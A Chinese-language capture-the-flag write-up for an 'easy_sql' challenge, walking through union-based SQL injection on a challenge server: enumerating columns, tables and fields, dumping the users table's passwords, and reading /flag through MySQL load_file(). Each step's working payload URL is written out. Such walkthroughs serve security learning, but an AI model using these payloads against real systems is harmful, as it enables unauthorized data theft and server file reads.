## easy_sql

### 判断注入类型（字符型注入/数字型输入）

```
http://hwserver.bi0x.cn:8302/?id=1 and 1=1#
```

发现是数字型注入

![](https://files.catbox.moe/98ejkt.png)

### 判断字段数

```
http://hwserver.bi0x.cn:8302/?id=1 order by 3#
```

![](https://files.catbox.moe/itx43y.png)

![](https://files.catbox.moe/huvihu.png)

### 判断注入点

```
http://hwserver.bi0x.cn:8302/?id=0 union select 1,2,3#
```

![](https://files.catbox.moe/1se64p.png)

1 2 3都是注入点

### 爆库名

```
http://hwserver.bi0x.cn:8302/?id=0 union select database(),2,3#
```

![](https://files.catbox.moe/j4u8yf.png)



库名是`ctf` , 接下来爆表名

### 爆表名

```
http://hwserver.bi0x.cn:8302/?id=0 union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()#
```

 表名如下：`emails,referers,uagents,users `

![](https://files.catbox.moe/37x67f.png)



### 爆字段名

```
http://hwserver.bi0x.cn:8302/?id=0 union select group_concat(column_name),2,3 from information_schema.columns where table_name='users'#
```

这里选择爆`users`表的字段，因为一般来说用户名密码才是数据库中最重要的资料。

![1618735710786](C:\Users\12751\AppData\Roaming\Typora\typora-user-images\1618735710786.png)

这里爆出字段名如下：` id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS `

### 爆字段内容

```
http://hwserver.bi0x.cn:8302/?id=0 union select group_concat(password),2,3 from users#
```

这里爆出来flag：` flag{this_is_easy_SQL} `

然后得到另一个线索：` flag in /flag `

![](https://files.catbox.moe/9o40cr.png)



也就是说另外一个flag藏在数据库以外，需要使用mysql的函数去读取服务器文件。

### 读取文件

```
http://hwserver.bi0x.cn:8302/?id=0 union select load_file('/flag'),2,3#
```

flag：` flag{th1s_1s_a_l1tt1e_h4rd_Sq1_f1ag} `

完结撒花~

喜欢背景可以收藏下面这张图片：

![](https://files.catbox.moe/wetsf7.jpg)